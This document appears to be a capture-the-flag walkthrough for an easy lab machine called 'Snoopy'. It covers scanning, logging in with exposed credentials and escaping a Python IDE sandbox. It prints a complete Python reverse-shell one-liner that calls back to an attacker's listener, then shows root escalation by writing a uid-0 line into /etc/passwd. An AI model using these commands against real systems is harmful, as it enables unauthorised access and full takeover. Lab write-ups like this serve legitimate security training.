# Snoopy VM (Easy Difficulty) 

Author : Jerick 

# Walkthrough
Step 1: nmap -p (ip of infected) -A 

Step 2: Notice that there is ssh and webserver available. Visit the webpage of the ip address. 

Graphical user interface

Description automatically generated 

Step 3: Sign up is unavailable so click sign in. The login credentials can be found in a directory that is revealed during the nmap scan. (/zbir7mn240soxhicso2z) 

Step 4: Login credentials are found in this directory. Use this to login.  

Graphical user interface, text, application

Description automatically generated 

Step 5: This page seems to be a python code tester. You can leverage this to gain a shell on this system. This page boasts that the online IDE has some protections in place.  

Graphical user interface, text

Description automatically generated 

Step 6: Analyse the code given to us.  

Text

Description automatically generated 

It prevents us from importing modules. The webpage gives us a hint where you can use the exec() function instead.  

Step 7: Set up a netcat listener on kali and enter the following into the IDE 

Text

Description automatically generated 

Command:  

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("host ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); 

nc -lvnp 4444  

Step 8: Now u have a shell as a http user. Since we have access to py user’s home directory, look inside it. 

Step 9: Execute the file typing.cc. This will give you the password for user py. 

Text

Description automatically generated 

Step 10: su as user py and cat user.txt to get the user flag. 

Step 11: To get the root flag, we would need to add a new entry into the /etc/passwd file to allow us to login as root user.  

Step 12: Create a new user and password and hash the password using openssl. Execute the backup file and enter the line of text in the same format as what u see in /etc/passwd.  

Commands:  

Openssl passwd -1 -salt (user) (passwd) 

Format to enter when executing backup: (user):(hashed passwd here):0:0:/root:/bin/bash 

Step 13: Su as the new user u created and you now have root access. 

Step 14: Retrieve the root flag 

Commands: 

Cd /root 

Cat root.txt 

